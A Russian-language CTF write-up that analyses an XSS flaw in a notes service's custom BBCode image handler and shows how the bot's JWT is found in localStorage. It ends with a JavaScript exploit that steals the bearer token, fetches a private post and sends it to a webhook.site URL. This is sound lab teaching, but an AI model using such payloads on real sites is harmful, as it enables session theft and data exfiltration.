---
title: Test writeup SAS CTF
layout: base.njk
---

Приложение представляет из  себя классический ctf таск на xss - есть сервис заметок и бот, переходящий по ссылке на заметку пользователя (оставив предварительно у себя на аккаунте приватную заметку с флагом).
Рассматривая функциональность сервиса можно обратить внимание на несколько нетипичных для сервиса с Flask на бэкенде вещей:
 - для авторизации используется не `session` встроенный в фреймворк, а `jwt` токен в запросах вида.
```
GET /api/posts?page=1&per_page=5 HTTP/1.1
Host: [::1]
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0ODE2MzY0NywianRpIjoiODEwZjU4ODItZmE2Mi00NGVmLTg2NDMtYWM0OTNlZjRhZDA1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRhOWIzNjQyLWY0NDMtNGIwNS1iMjAzLWVkOGM0N2E0NTA0ZCIsIm5iZiI6MTc0ODE2MzY0NywiZXhwIjoxNzQ4MTY3MjQ3LCJsb2dpbl90aW1lIjoxNzQ4MTYzNjQ3LjMxMDQ3fQ.KO6djKOdHCLN601cxw7weVtMM9aN5kcxnG589LjVKtY
```
 причем `jwt` - даже не куки а именно `Authorization` заголовок.
 - во время использования сервиса бросается в глаза возможность отставлять комментарии под заметками которой часто нет в тасках подобного вида. 
 - в поле комментария отображается очень подозрительная надпись
 ![[Pasted image 20250527201945.png]]
 Предлагается использовать некий язык разметки под названием `BBCode` а как мы знаем в реалкейсах очень часто встречается xss из-за WYSIWYG-редакторов при внедрении html в комментарии или электронную почту или при использовании markdown.
## Первичное предположение уязвимости
1) Проблема в BBCode
2) Проблема в JWT
## Проблема в BBCode
Открываем код сервиса в попытке проверить зависимости и посмотреть не устарела ли версия модуля с поддержкой BBCode однако его не нахожу, обработка BBCode кастомная что еще раз наталкивает на мысли об уязвимой реализации.
Смотрим `backend/app/routes/comments.py`
```
@comments_bp.route('/user/<user_id>/posts/<post_id>', methods=['POST'])
@jwt_required()
def create_comment(user_id, post_id):
	....
    parser = BBCodeParser()
    content_html = parser.parse(content)
	....
```
Перейдем в `backend/app/utils/bb_parser.py` и рассмотрим код `BBCodeParser`.
```
def parse(self, text):
	if not text:
		return ""

	escaped_text = html.escape(text)
	
	result = escaped_text
	for tag in self.allowed_tags:
		if tag in self.tag_handlers:
			result = self.tag_handlers[tag](result)
	
	return result
```
> Рассмотрим процесс обработки обычной xss нагрузки `<img src=1 onerror=alert(1)>.
> Сначала весь текст экранируется с помощью html.escape(text). Это преобразует специальные HTML-символы в их безопасные эквиваленты:
    - < → &lt;
    - > → &gt;
    - & → &amp;
```
s = s.replace("&", "&amp;") # Must be done first!
s = s.replace("<", "&lt;")
s = s.replace(">", "&gt;")
if quote:
	s = s.replace('"', "&quot;")
	s = s.replace('\'', "&#x27;")
return s
```
> На выходе функции получаем `&lt;img src=1 onerror=alert(1)&gt;`.

При просмотре того как обрабатывалась бы обычная xss-нагрузка видим что хотя код ниже отработал, он бы ничего не сделал.
```
for tag in self.allowed_tags:
	if tag in self.tag_handlers:
		result = self.tag_handlers[tag](result)
```
Согласно логики работы парсера BBCode для того чтобы разметка img была обработана она должна соответствовать regex.
```
simple_pattern = r'\[img\](https?://[^"\'\[\]<>]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
```
Полный код обработчика тега img представлен ниже.
```
    def _handle_image(self, text):
        simple_pattern = r'\[img\](https?://[^"\'\[\]<>]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
        text = re.sub(simple_pattern, 
                      r'<img src="\1" alt="User posted image" style="max-width:100%;">', 
                      text)

        dim_pattern = r'\[img=(\d+),(\d+)\](https?://[^"\'\[\]<>]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
        text = re.sub(dim_pattern, 
                      r'<img src="\3" width="\1" height="\2" alt="User posted image" style="max-width:100%;">', 
                      text)

        attr_pattern = r'\[img ([^\]]+)\](https?://[^"\'\[\]<>]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
        
        def img_attr_replacer(match):
            attrs_str = match.group(1)
            img_url = match.group(2)
            return f'<img src="{img_url}" {attrs_str} style="max-width:100%;">'
            
        text = re.sub(attr_pattern, img_attr_replacer, text)
        
        return text
```
Регулярное выражение attr_pattern находит тег вида `[img атрибуты]URL[/img]`.
- attrs_str — это строка атрибутов (в нашем случае onerror=alert(1)).
- img_url — это URL изображения `(http://example.com/image.jpg)`.
- Функция img_attr_replacer вставляет attrs_str напрямую в HTML-тег <img> без какой-либо фильтрации.
#### Пример обработки
```
def img_attr_replacer(match):
            attrs_str = match.group(1)
            img_url = match.group(2)
            return f'<img src="{img_url}" {attrs_str} style="max-width:100%;">'
```
Для ввода `[img onerror=alert(1)]http://example.com/image.jpg[/img]:
- match.group(1) = onerror=alert(1).
- match.group(2) = `http://example.com/image.jpg`
Результат замены `<img src="http://example.com/image.jpg" onerror=alert(1) style="max-width:100%;">`
![[Pasted image 20250527205710.png]]XSS найден. Боту передается как раз ссылка на наш пост, значит у него тоже сработает javascript.
#### Troubleshooting
К сожалению есть несколько проблем 
- мы все еще не знаем адрес заметки бота
- раз не используется куки, просто написать в `fetch` строчку `credentials: 'include'` для того чтобы использовать авторизацию пользователя не получится
##### Получаем токен авторизации
В браузере не встроен автоматический механизм запоминания токенов используемых в заголовке `Authorization`, значит это делается на фронте у пользователя. Посмотрим где хранятся токены (вероятно в localstorage)
Смотрим код и видим строчки вида
```
interceptors.request.use((e=>{const t=localStorage.getItem("DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique")
```
Проверяем в браузере - так и есть.
![[Pasted image 20250527210950.png]]
##### Получаем uuid заметки бота
По адресу `/dashboard` фронтенд пользователя делает запрос вида
```
GET /api/posts?page=1&per_page=5 HTTP/1.1
```
Получая в ответ
```
{
  "items": [
    {
      "author": "testtest",
      "comments_count": 1,
      "content": "test",
      "created_at": "2025-05-27T17:07:44.284123",
      "id": 1,
      "top_comments": [
        {
          "author": "testtest",
          "content": "<img src=\"http://example.com/image.jpg\" onerror=alert(1) style=\"max-width:100%;\">",
          "created_at": "2025-05-27T17:56:53.432094",
          "id": 1,
          "post_id": 1,
          "user_id": "b3e28d05-23b1-4d0c-8acb-cbd50bce2602"
        }
      ],
      "updated_at": "2025-05-27T17:07:44.284133",
      "user_id": "b3e28d05-23b1-4d0c-8acb-cbd50bce2602"
    }
  ],
  "page": 1,
  "pages": 1,
  "per_page": 5,
  "total": 1
}
```
В свою очередь заметки доступны по адресу вида
```
@posts_bp.route('/user/<user_id>/posts/<post_id>', methods=['GET'])
```
Ввиду того, что мы знаем что комментарий оставляется ботом сразу после регистрации, `post_id`. Заметка будет лежать по адресу.
```
/user/<user_id>/posts/1
```
В свою очередь user_id нам известен из запроса на `/api/posts`.
##### Exploit
Таким образом эксплоит должен выполнять следующие действия.
1) Получает token из localstorage
2) Использует его в заголовке `Authorization: Bearer` далее
3) Делает запрос на `/api/posts`
4) Получает `user_id`
5) Делает запрос на `/user/<user_id>/posts/<post_id>`
6) Получает флаг из `class="post-content"`
7) Отправляет base64 флаг на webhook
```
fetch("/api/posts", {
    headers: {
        'Authorization': `Bearer ${localStorage.getItem("DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique")}`
    }
})
.then(response => response.json())
.then(data => {
    return fetch(`/api/posts/user/${data.items[0].user_id}/posts/1`, { 
        headers: {
            'Authorization': `Bearer ${localStorage.getItem("DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique")}`
        } 
    });
})
.then(response => response.json())
.then(flag => {
    const content = flag.comments.items[0].content;
    fetch(`https://webhook.site/ce7bcd4f-0512-40d5-886b-168da9b25574?flag=${btoa(content)}`);
})
```